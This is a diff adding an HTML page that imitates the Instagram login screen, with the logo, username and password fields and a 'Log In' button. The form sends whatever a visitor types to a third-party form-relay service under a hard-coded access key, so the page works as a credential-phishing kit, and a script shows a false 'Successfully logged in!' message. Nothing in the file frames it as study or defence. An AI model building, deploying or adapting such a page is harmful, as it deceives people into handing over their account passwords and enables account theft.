@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+            width: 350px; /* Adjusted width for better layout */
+        }
+
+        .logo img {
+            width: 90px; /* Adjusted logo size */
+            margin-bottom: 20px;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 20px;
+        }
+
+        .login-form input {
+            margin: 10px 0;
+            padding: 12px; /* Increased padding for input fields */
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 14px; /* Adjusted font size */
+        }
+
+        .login-form button {
+            padding: 12px; /* Increased padding for button */
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px; /* Adjusted font size */
+            transition: background-color 0.3s; /* Added transition effect */
+        }
+
+        .login-form button:hover {
+            background-color: #007bbf;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+            text-decoration: none;
+            color: #00376b;
+            font-size: 14px; /* Adjusted font size */
+        }
+
+        .signup {
+        z-index:1000000000;
+            margin-top: 20px;
+            font-size: 14px; /* Adjusted font size */
+        }
+
+        .signup a {
+            color: #0095f6; /* Make the sign-up link color similar to Instagram */
+            text-decoration: none;
+        }
+
+        .signup a:hover {
+            text-decoration: underline; /* Underline on hover */
+        }
+
+        .success-message {
+            display: none; /* Hidden by default */
+            font-size: 18px;
+            color: green;
+            margin-top: 20px;
+            z-index:1990000;
+        }
+    </style>
+    
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="ok.png" alt="Instagram Logo"> <!-- Make sure this is the correct path to your logo -->
+        </div>
+        <form class="login-form"  action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="3a0cc51d-55e2-492a-bb04-c7ba1b276da6">
+            <input name="username"type="text" placeholder="Username" required>
+            <input name="passsword" type="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </form>
+        <div class="signup">
+            <p>Don't have an account? <a href="#">Sign Up</a></p>
+        </div>
+        
+        <div class="success-message">
+            Successfully logged in!
+            
+        </div>
+        
+    </div>
+    
+    
+    <script>
+        
+        function handleLogin(event) {
+            event.preventDefault();
+            document.querySelector('.login-form').style.display = 'none';
+            // Show the success message
+            document.querySelector('.success-message').style.display = 'block';
+        }
+        
+    </script>
+</body>
+</html>
